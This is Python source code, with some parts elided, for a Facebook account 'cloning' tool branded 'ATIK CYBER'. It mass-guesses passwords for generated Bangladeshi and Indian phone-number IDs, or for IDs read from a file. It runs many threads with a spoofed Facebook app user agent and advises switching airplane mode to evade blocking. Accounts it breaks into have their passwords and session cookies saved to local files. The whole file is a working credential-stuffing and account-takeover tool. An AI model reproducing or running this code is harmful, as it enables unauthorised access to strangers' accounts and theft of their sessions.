...
print(f'\x1b[38;5;160m[\033[1;37m●\x1b[38;5;160m]\x1b[38;5;46m SYSTEM CRACKING..\n')
...
sys.stdout.write('\x1b]2; ☠_CYBER_☠\x07')
...
{G}▐▌ ▐▌ █  ▗▄█▄▖▐▌ ▐▌    ▗▞▘▝▚▖▝▚▄▄▖
──────────────────────────────────────────────────
{R}[{A}●{R}]{G} FACEBOOK          {R}[{A}●{R}]{G} XC ATIK XCP
{R}[{A}●{R}]{G} OWNER             {R}[{A}●{R}]{G} IMRAN x ATIK
{R}[{A}●{R}]{G} TOOLS             {R}[{A}●{R}]{G} FILE CLONE V.1-2 
──────────────────────────────────────────────────"""
...
def menu():   
    os.system('espeak -a 300 " WELLCOME,  TO,  MR,  ATIK CYBER V I P,  TOOLS"')
    clear()
    print(f'{R}[{A}1{R}]{G} FILE CLONING')
    print(f'{R}[{A}2{R}]{G} RANDOM CLONING')         
    linex()
    select = input(f'{R}[{A}?{R}]{G} CHOICE {A}:{G} ')
    ...
    if select =='1':
        ...
        exit(f'{A}[{G}={A}]{A} EXIT DONE ')
    else:
        print(f'{A}[{G}={A}]{A} VALID OPTION')
        time.sleep(2)
        menu()
#__________________[ RANDOM ]__________________#      
def _randm_():   
    clear()
    print(f'{R}[{A}1{R}]{G} BANGLADESH CLONING')
    print(f'{R}[{A}2{R}]{G} INDIA CLONING')
    print(f'{R}[{A}0{R}]{G} BACK TO MAIN MENU')
    linex()
    select = input(f'{R}[{A}?{R}]{G} CHOICE {A}:{G} ')
    if select =='1':
        _bd_()
        ...
        print(f'{R}[{A}={G}]{G} VALID OPTION')
        time.sleep(2)
        _randm_()
#__________________[ BANGLADESH ]__________________#
def _bd_():
    clear()
    print(f'{R}[{A}={R}]{G} EXAMPLE {A}:{G} 017{A}/{G}019{A}/{G}018{A}/{G}016');linex()
    code = input(f'{R}[{A}?{R}]{G} CHOICE  {A}:{G} ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    clear()
    print(f'{R}[{A}={R}]{G} EXAMPLE {A}:{G} 3000{A}/{G}5000{A}/{G}10000{A}/{G}99999');linex()
    limit = int(input(f'{R}[{A}?{R}]{G} CHOICE  {A}:{G} '))
    ...
    with Habib(max_workers=30) as sexy:
        clear()
        print(f'{R}[{A}={R}]{G} SIM CODE  {A}:{G} {code}')
        print(f'{R}[{A}={R}]{G} TOTAL UID {A}:{G} {str(len(user))}')
        print(f'{R}[{A}={R}]{G} TURN {R}[{A}ON{A}/{A}OFF{R}]{G} AIRPLANE MODE EVERY {A}3{G} MIN');linex()
        for love in user:
            ids = code+name+cod+love
            psd = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh','sadiya','sumaiya','@@@###','sanjida','samiya']
            sexy.submit(randm,ids,psd)
    print('')
    print(f'\r{A}──────────────────────────────────────────────────')
    print(f'{G}[{A}={G}]{G} THE PROCESS HAS BEEN COMPLETED')
    print(f'{G}[{A}={G}]{G} TOTAL OK ID {A}:{G} {str(len(ok))}')
    print(f'{G}[{A}={G}]{G} TOTAL CP ID {A}:{G} {str(len(cp))}')
    print(f'\r{A}──────────────────────────────────────────────────')
...
def _India_():
    clear()
    print(f'{R}[{A}={R}]{G} EXAMPLE {A}:{G} +91639{A}/{G}+91934{A}/{G}+91902{A}/{G}+91701');linex()
    code = input(f'{R}[{A}?{R}]{G} CHOICE  {A}:{G} ')
    clear()
    print(f'{R}[{A}={R}]{G} EXAMPLE {A}:{G} 3000{A}/{G}5000{A}/{G}10000{A}/{G}99999');linex()
    limit = int(input(f'{R}[{A}?{R}]{G} CHOICE  {A}:{G} '))
    ...
    print(f'{G}[{A}={G}]{G} TOTAL CP ID {A}:{G} {str(len(cp))}')
    print(f'\r{A}──────────────────────────────────────────────────')
    input(f'{G}[{A}={G}]{G} PRESS ENTER TO BACK ')
    menu()
...
def _file_():
    global methods
    clear()
    print(f'{R}[{A}1{R}]{G} METHOD {R}[{A}M1{R}]{G} ')
    print(f'{R}[{A}2{R}]{G} METHOD {R}[{A}M2{R}]{G} ')
    print(f'{R}[{A}3{R}]{G} METHOD {R}[{A}M3{R}]{G} ')
    print(f'{R}[{A}4{R}]{G} METHOD {R}[{A}M4{R}]{G} ')
    print(f'{R}[{A}5{R}]{G} METHOD {R}[{A}M5{R}]{G} ')
    print(f'{R}[{A}6{R}]{G} METHOD {R}[{A}M6{R}]{G} ')
    linex()
    option = input(f'{R}[{A}?{R}]{G} CHOICE {A}:{G} ')
    if option =='1':
...
class main_crack():
    ...
    def crack(self,id):
        global methods
        clear()
        print(f'{R}[{A}={R}]{G} EXAMPLE {A}:{G} /sdcard/ATIK.txt');linex()
        os.system('espeak -a 300 " ENTER,   YOUR,   FILE,   NAME"')
        self.file = input(f'{R}[{A}?{R}]{G} FILE NAME {A}:{G} ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print(f'{R}[{A}={R}]{G} OPPS FILE NOT FOUND ...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print(f'{R}[{A}={R}]{G} TRY AGAIN ...')
            time.sleep(2)
            main_crack().crack(id)
#__________________[ FILE METHOD M1 ]__________________#           
    def methodA(self, sid, name, psw):
        try:
            ...
            animasi = random.choice(["\x1b[1;91mATIK","\x1b[1;92mATIK","\x1b[1;93mATIK","\x1b[1;94mATIK","\x1b[1;95mATIK","\x1b[1;96mATIK","\x1b[1;97mATIK","\x1b[1;91mATIK","\x1b[1;92mATIK","\x1b[1;93mATIK","\x1b[1;94mATIK","\x1b[1;95mATIK","\x1b[1;96mATIK"]) 
            sys.stdout.write(f"\r{R}[{A}●{R}] {A}[{animasi}-{X}F1{A}]{G}-{A}[{S}{loop}{A}]{G}-{A}[{G}OK{A}/{R}CP{A}]{G}-{A}[{G}{len(oks)}{Y}/{R}{len(cps)}{A}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:       
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r\r{G}[SUCCESS-💚] {sid} | {ps}\n ")
                    os.system('espeak -a 300 " CONGRATULATIONS ,   OK ID CLONING ,  DONE"')
                    open('/sdcard/ATIK-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{G}[SUCCESS-💚] {sid} | {ps}\n ")
                     #os.system('espeak -a 300 " C,  P"')
                     open('/sdcard/ATIK-M1-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                else:
                    continue
            loop+=1
...
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            animasi = random.choice(["\x1b[1;91mATIK","\x1b[1;92mATIK","\x1b[1;93mATIK","\x1b[1;94mATIK","\x1b[1;95mATIK","\x1b[1;96mATIK","\x1b[1;97mATIK","\x1b[1;91mATIK","\x1b[1;92mATIK","\x1b[1;93mATIK","\x1b[1;94mATIK","\x1b[1;95mATIK","\x1b[1;96mATIK"]) 
            sys.stdout.write(f"\r{R}[{A}●{R}] {A}[{animasi}-{X}F2{A}]{G}-{A}[{S}{loop}{A}]{G}-{A}[{G}OK{A}/{R}CP{A}]{G}-{A}[{G}{len(oks)}{Y}/{R}{len(cps)}{A}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r\r{M}[ATIK-CP] {sid} | {ps} ")
                    os.system('espeak -a 300 " C,   P"')
                    open('/sdcard/ATIK-M2-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
...
#__________________[ FILE METHOD M3 ]__________________#           
    def methodC(self, sid, name, psw):
        try:
            ...
            animasi = random.choice(["\x1b[1;91mATIK","\x1b[1;92mATIK","\x1b[1;93mATIK","\x1b[1;94mATIK","\x1b[1;95mATIK","\x1b[1;96mATIK","\x1b[1;97mATIK","\x1b[1;91mATIK","\x1b[1;92mATIK","\x1b[1;93mATIK","\x1b[1;94mATIK","\x1b[1;95mATIK","\x1b[1;96mATIK"]) 
            sys.stdout.write(f"\r{R}[{A}●{R}] {A}[{animasi}-{X}M3{A}]{G}-{A}[{S}{loop}{A}]{G}-{A}[{G}OK{A}/{R}CP{A}]{G}-{A}[{G}{len(oks)}{Y}/{R}{len(cps)}{A}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:       
                ...
                if 'session_key' in q:
                    ...
                    open('/sdcard/ATIJ-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{M}[ATIK-CP] {sid} | {ps} ")
...
#__________________[ FILE METHOD M4 ]__________________#             
    def methodD(self, sid, name, psw):
        try:
            ...
            animasi = random.choice(["\x1b[1;91mATIK","\x1b[1;92mATIK","\x1b[1;93mATIK","\x1b[1;94mATIK","\x1b[1;95mATIK","\x1b[1;96mATIK","\x1b[1;97mATIK","\x1b[1;91mATIK","\x1b[1;92mATIK","\x1b[1;93mATIK","\x1b[1;94mATIK","\x1b[1;95mATIK","\x1b[1;96mATIK"]) 
            sys.stdout.write(f"\r{R}[{A}●{R}] {A}[{animasi}-{X}M4{A}]{G}-{A}[{S}{loop}{A}]{G}-{A}[{G}OK{A}/{R}CP{A}]{G}-{A}[{G}{len(oks)}{Y}/{R}{len(cps)}{A}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
                    print(f"\r\r{M}[CP-2F] {sid} | {ps} ")
                    os.system('espeak -a 300 " CP,   ID"')
                    open('/sdcard/ATIK-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{G}[OK-ID] {sid} | {ps} ")
                    os.system('espeak -a 300 "O ,   K"')
                    open('/sdcard/ATIK-M2-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
...
#__________________[ FILE METHOD M5 ]__________________#           
    def methodE(self, sid, name, psw):
        try:
            ...
            animasi = random.choice(["\x1b[1;91mATIK","\x1b[1;92mATIK","\x1b[1;93mATIK","\x1b[1;94mATIK","\x1b[1;95mATIK","\x1b[1;96mATIK","\x1b[1;97mATIK","\x1b[1;91mATIK","\x1b[1;92mATIK","\x1b[1;93mATIK","\x1b[1;94mATIK","\x1b[1;95mATIK","\x1b[1;96mATIK"]) 
            sys.stdout.write(f"\r{R}[{A}●{R}] {A}[{animasi}-{X}M5{A}]{G}-{A}[{S}{loop}{A}]{G}-{A}[{G}OK{A}/{R}CP{A}]{G}-{A}[{G}{len(oks)}{Y}/{R}{len(cps)}{A}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
#__________________[ FILE METHOD M6 ]__________________#             
    def methodF(self, sid, name, psw):
        try:
            ...
            animasi = random.choice(["\x1b[1;91mATIK","\x1b[1;92mATIK","\x1b[1;93mATIK","\x1b[1;94mATIK","\x1b[1;95mATIK","\x1b[1;96mATIK","\x1b[1;97mATIK","\x1b[1;91mATIK","\x1b[1;92mATIK","\x1b[1;93mATIK","\x1b[1;94mATIK","\x1b[1;95mATIK","\x1b[1;96mATIK"]) 
            sys.stdout.write(f"\r{R}[{A}●{R}] {A}[{animasi}-{X}F7{A}]{G}-{A}[{S}{loop}{A}]{G}-{A}[{G}OK{A}/{R}CP{A}]{G}-{A}[{G}{len(oks)}{Y}/{R}{len(cps)}{A}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
#__________________[ PASSWORD ]__________________#
    def pasw(self):       
            pw = []
            clear()
            print(f'{R}[{A}={R}]{G} EXAMPLE {A}:{G} BD 10-18/INDIA 3-5');linex()
            sl = int(input(f'{R}[{A}?{R}]{G} PASSWORD LIMIT {A}:{G} '))
            clear()
            print(f'{R}[{A}?{R}]{G} EXAMPLE {A}:{G} first123/firstlast/first@@@')
            linex()
            if sl =='':
                print(f'{R}[{A}={R}]{G} PUT LIMIT BETWEEN 1 TO 30')
            elif sl > 20:
                print(f'{R}[{A}={R}]{G} PASSWORD LIMIT SHOULD NOT BE GREATER THAN 30')
            else:
                for sr in range(sl):
                    pw.append(input(f'{R}[{A}={G}]{G} PASSWORD NO {G}[{A}{sr+1}{G}] {A}:{G} '))
            clear()
            print(f'{R}[{A}●{R}]{G} TOTAL FILE UID {A}:{G} %s ' % len(self.id))
            print(f'{R}[{A}●{R}]{G} PASSWORD LIMIT {A}:{G} {sl} ')
            print(f'{R}[{A}●{R}]{G} TURN {R}[{A}ON{A}/{A}OFF{R}]{G} AIRPLANE MODE EVERY {A}3{G} MIN')
            linex()
...
def randm(ids,psd):
    global loop,ok,cp
    sys.stdout.write(f"\r{R}[{A}●{R}] {R}[{A}ATIK-XD{R}]{A}-{R}[{A}{loop}{R}]{A}-{R}[{A}OK{R}/{A}CP{R}]{A}-{R}[{A}{len(ok)}{R}/{A}{len(cp)}{R}] ")
    ua1  = '[FBAN/FB4A;FBAV/419.0.0.29.71;FBBV/'+str(random.randint(1111111,7777777))+';FBDM/{density=3.8,width=1111,height=1241};FBLC/en_GB;FBCR/Smarty;FBMF/Motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1795;FBSV/15.8.3;FBCA/x86_64:x86:armeabi-v7a;]'
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            ...
            if 'access_token' in q:
                ...
                print(f'\r\r{G}[ATIK-OK] {uid} | {pas}')
                print(f'\r\r{G}[COOKIE]{G} {coki}')
                open('/sdcard/ATIK-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
